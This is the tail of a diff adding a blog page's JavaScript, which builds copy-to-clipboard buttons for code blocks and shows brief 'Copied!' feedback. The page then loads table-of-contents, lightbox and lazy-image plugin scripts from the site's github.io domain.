+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
